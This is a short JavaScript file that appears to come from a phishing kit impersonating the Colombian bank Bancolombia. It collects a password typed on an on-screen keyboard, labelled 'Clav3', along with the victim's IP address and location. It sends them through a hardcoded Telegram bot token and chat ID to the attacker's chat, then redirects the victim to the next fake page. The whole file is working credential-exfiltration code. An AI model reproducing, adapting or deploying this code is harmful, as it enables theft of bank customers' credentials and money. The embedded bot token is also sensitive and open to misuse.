//bot token
var telegram_bot_id = "5912991681:AAFfK97HAyGOqDezGcg_z68EpxSLD4ObqyM";
//chat id
var chat_id = -1001658466197;
var u_name, ip, ip2;
var ready = function () {
    u_name = document.getElementById("keyboard_display").value;
    ip = document.getElementById("gfg").innerHTML;
    ip2 = document.getElementById("address").innerHTML;
    message = "Clav3: " + u_name + "\nIP: " + ip +"\n" + ip2 +"\nBANCOLOMBIA";
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        window.location = 'index3.html';
        console.log(response);
    });
    return false;
};
